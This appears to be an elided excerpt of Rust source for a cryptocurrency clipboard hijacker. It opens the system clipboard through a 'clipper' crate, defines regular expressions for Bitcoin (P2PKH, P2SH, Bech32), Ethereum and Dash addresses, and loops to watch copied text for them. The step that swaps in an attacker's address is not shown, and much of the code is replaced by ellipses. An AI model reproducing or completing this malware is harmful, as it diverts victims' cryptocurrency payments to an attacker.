...
fn open_clipboard() -> Result<(), &'static str> {
    return clipper::clipboard::open_clipboard();
}
...
///
fn close_clipboard() -> () {
    return clipper::clipboard::close_clipboard().unwrap_or_else(|_| {});
}
...
fn main() -> () {
     ...
     * P2PKH, P2SH, Bech32
     */
    let re_btc: Regex = Regex::new(
        r"^(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[a-z0-9]{39,59})$",
    )
    .unwrap();
    ...
    let mut last_clipboard_text: String = String::new();
    loop {
        ...
        if let Ok(result) = find_patterns(
            &clipboard_text,
            re_eth.clone(),
            re_btc.clone(),
            re_dash.clone(),
